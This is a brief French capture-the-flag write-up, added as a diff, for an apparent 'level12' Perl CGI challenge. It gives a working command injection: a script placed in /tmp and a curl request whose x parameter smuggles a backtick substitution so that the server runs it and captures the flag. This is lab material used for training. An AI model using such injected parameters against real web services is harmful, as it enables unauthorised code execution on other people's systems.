@@ -1,0 +1,7 @@
+ls -la, on touve un script perl.
+Comme au level04 on va essayer d'exploit les parametre.
+Le parametre x est interessant car egrep est exploitable.
+X fait un uppercase et ignore tout ce qu'il y a apres le premier whitespace, on va donc creer un script en lui donnant un nom uppercase et on devra donner un path general et pas /tmp/SCRIPT.
+le script: echo 'echo `getflag` > /tmp/flag' > /tmp/SCRIPT
+On creer la requete http, curl 'localhost:4646/level12.pl?x=`/*/SCRIPT`'
+cat le file creer par le script.
